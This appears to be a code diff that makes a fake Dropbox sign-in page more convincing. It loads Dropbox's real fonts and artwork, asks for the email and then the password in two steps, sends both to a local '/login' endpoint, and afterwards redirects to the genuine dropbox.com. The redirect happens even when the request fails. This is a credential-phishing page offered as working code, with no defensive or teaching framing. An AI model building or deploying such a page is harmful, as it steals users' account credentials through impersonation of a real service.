@@ -4,85 +4,133 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Dropbox</title>
+    <link rel="icon" type="image/png" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
     <style>
+        @font-face {
+            font-family: "Atlas Grotesk";
+            src: url("https://cfl.dropboxstatic.com/static/fonts/atlas-grotesk/AtlasGrotesk-Regular-Web-v2.woff2") format("woff2");
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: "Atlas Grotesk";
+            src: url("https://cfl.dropboxstatic.com/static/fonts/atlas-grotesk/AtlasGrotesk-Medium-Web-v2.woff2") format("woff2");
+            font-weight: 500;
+            font-style: normal;
+        }
+
         body {
-            font-family: "Sharp Grotesk", "Atlas Grotesk", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-family: "Atlas Grotesk", "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
             background-color: #fff;
             margin: 0;
             display: flex;
+            height: 100vh;
+            color: #1e1919;
+            overflow: hidden;
+        }
+
+        .left-panel {
+            flex: 1;
+            background-color: #f7f9fa;
+            display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            overflow: hidden;
         }
-        .container {
-            width: 400px;
+
+        .left-panel img {
+            max-width: 80%;
+            max-height: 80%;
+            object-fit: contain;
+        }
+
+        .right-panel {
+            width: 480px;
             padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            background: white;
+            box-shadow: -5px 0 20px rgba(0,0,0,0.02);
+            z-index: 10;
         }
+
+        .login-container {
+            width: 100%;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 40px;
-        }
-        .logo img {
-            height: 34px;
-        }
-        h2 {
-            font-size: 20px;
-            font-weight: 500;
             margin-bottom: 20px;
         }
+
+        .header h2 {
+            font-size: 19px;
+            font-weight: 500;
+            margin: 0;
+        }
+
+        .header a {
+            font-size: 14px;
+            color: #0061fe;
+            text-decoration: none;
+        }
+
         .input-group {
             margin-bottom: 15px;
+            position: relative;
         }
+
         label {
             display: block;
-            font-size: 14px;
+            font-size: 12px;
             font-weight: 500;
             margin-bottom: 5px;
             color: #1e1919;
         }
+
         input {
             width: 100%;
-            padding: 12px;
+            padding: 10px 12px;
             border: 1px solid #637282;
-            border-radius: 0;
-            font-size: 16px;
+            border-radius: 2px;
+            font-size: 14px;
             box-sizing: border-box;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            font-family: inherit;
         }
+
         input:focus {
             border-color: #0061fe;
             outline: none;
             box-shadow: 0 0 0 2px rgba(0, 97, 254, 0.2);
         }
-        .actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-        }
-        .forgot {
-            color: #0061fe;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .login-btn {
+
+        .btn-primary {
             background-color: #0061fe;
             color: white;
             border: none;
-            padding: 12px 24px;
-            font-size: 16px;
+            border-radius: 2px;
+            padding: 10px 24px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             width: 100%;
-            margin-top: 20px;
+            margin-top: 15px;
+            transition: background-color 0.2s;
         }
-        .login-btn:hover {
+
+        .btn-primary:hover {
             background-color: #0055d4;
         }
-        .google-btn, .apple-btn {
+
+        .btn-google, .btn-apple {
             background: transparent;
-            border: 1px solid #c0c0c0;
+            border: 1px solid #a8b4c0;
             color: #1e1919;
             width: 100%;
             padding: 10px;
@@ -92,89 +140,277 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            border-radius: 2px;
+            font-size: 14px;
+            position: relative;
+            transition: background-color 0.1s;
         }
+        
+        .btn-google:hover, .btn-apple:hover {
+            background-color: #f7f9fa;
+        }
+
+        .btn-google svg, .btn-apple svg {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+        }
+
         .divider {
+            display: flex;
+            align-items: center;
             text-align: center;
             margin: 20px 0;
-            position: relative;
-        }
-        .divider span {
-            background: #fff;
-            padding: 0 10px;
             color: #637282;
             font-size: 12px;
         }
-        .divider::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            border-top: 1px solid #e6e8eb;
-            z-index: -1;
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e6e8eb;
         }
-    </style>
-    <script>
-        async function handleLogin(event) {
-            event.preventDefault();
-            const form = event.target;
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
-            
-            try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    window.location.href = "https://www.dropbox.com";
-                }
-            } catch (error) {
-                console.error('Error:', error);
+
+        .divider span {
+            padding: 0 10px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 2px solid #fff;
+            width: 16px;
+            height: 16px;
+            -webkit-animation: spin 1s linear infinite; /* Safari */
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-left: 5px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .user-pill {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border: 1px solid #e6e8eb;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        
+        .user-pill:hover {
+            background-color: #f7f9fa;
+        }
+
+        .user-avatar {
+            width: 24px;
+            height: 24px;
+            background-color: #0061fe;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            margin-right: 10px;
+        }
+
+        .user-email {
+            flex: 1;
+            font-size: 14px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .checkbox-wrapper input {
+            width: auto;
+            margin-right: 10px;
+        }
+        
+        .checkbox-wrapper label {
+            margin-bottom: 0;
+            font-weight: 400;
+        }
+
+        .footer-links {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #637282;
+        }
+
+        @media (max-width: 768px) {
+            .left-panel {
+                display: none;
+            }
+            .right-panel {
+                width: 100%;
+                padding: 20px;
             }
         }
-    </script>
+    </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Dropbox_Icon.svg/500px-Dropbox_Icon.svg.png" alt="Dropbox">
-                <span style="font-weight: bold; font-size: 24px; vertical-align: middle; margin-left: 10px;">Dropbox</span>
-            </div>
-        </div>
-        
-        <h2>Sign in</h2>
-        
-        <button class="google-btn">Sign in with Google</button>
-        <button class="apple-btn">Sign in with Apple</button>
-        
-        <div class="divider">
-            <span>or</span>
-        </div>
-        
-        <form id="login-form" onsubmit="handleLogin(event)">
-            <div class="input-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            
-            <div class="actions">
-                <label style="display: flex; align-items: center; font-weight: normal;">
-                    <input type="checkbox" style="width: auto; margin-right: 10px;"> Remember me
-                </label>
-                <a href="#" class="forgot">Forgot password?</a>
-            </div>
-            
-            <button type="submit" class="login-btn">Sign in</button>
-        </form>
+    <div class="left-panel">
+        <img src="https://cfl.dropboxstatic.com/static/images/empty_states/sign-in-v2.svg" alt="Dropbox">
     </div>
+    <div class="right-panel">
+        <div class="login-container">
+            <div class="header">
+                <h2>Sign in</h2>
+                <span>or <a href="#">create an account</a></span>
+            </div>
+
+            <!-- Step 1: Email -->
+            <div id="step-1">
+                <form onsubmit="goToStep2(event)">
+                    <div class="input-group">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary" id="btn-step1">
+                        Continue
+                    </button>
+
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+
+                    <button type="button" class="btn-google">
+                        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="none" d="M0 0h48v48H0z"/></svg>
+                        Sign in with Google
+                    </button>
+                    <button type="button" class="btn-apple">
+                        <svg viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>
+                        Sign in with Apple
+                    </button>
+                </form>
+            </div>
+
+            <!-- Step 2: Password -->
+            <div id="step-2" class="hidden fade-in">
+                <div class="user-pill" onclick="goToStep1()">
+                    <div class="user-avatar" id="avatar-char">U</div>
+                    <div class="user-email" id="display-email">user@example.com</div>
+                    <div style="font-size: 12px; color: #0061fe;">Edit</div>
+                </div>
+                
+                <form onsubmit="submitLogin(event)">
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" required>
+                    </div>
+
+                    <div class="checkbox-wrapper">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+
+                    <button type="submit" class="btn-primary" id="btn-login">
+                        Log in
+                    </button>
+                    
+                    <div style="text-align: center; margin-top: 15px;">
+                        <a href="#" style="color: #0061fe; font-size: 12px; text-decoration: none;">Forgot your password?</a>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="footer-links">
+                <!-- Footer content can go here if needed -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function goToStep2(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            if (!email) return;
+
+            const btn = document.getElementById('btn-step1');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = 'Loading <span class="spinner"></span>';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                document.getElementById('display-email').textContent = email;
+                document.getElementById('avatar-char').textContent = email.charAt(0).toUpperCase();
+                
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+                
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }, 800);
+        }
+
+        function goToStep1() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+        }
+
+        function submitLogin(event) {
+            event.preventDefault();
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            
+            if (!password) return;
+
+            const btn = document.getElementById('btn-login');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = 'Logging in <span class="spinner"></span>';
+            btn.disabled = true;
+
+            // Submit to server
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.dropbox.com/home";
+                } else {
+                    // Reset button on error
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                    alert("Incorrect email or password");
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                // Fallback redirect
+                window.location.href = "https://www.dropbox.com/home";
+            });
+        }
+    </script>
 </body>
 </html>
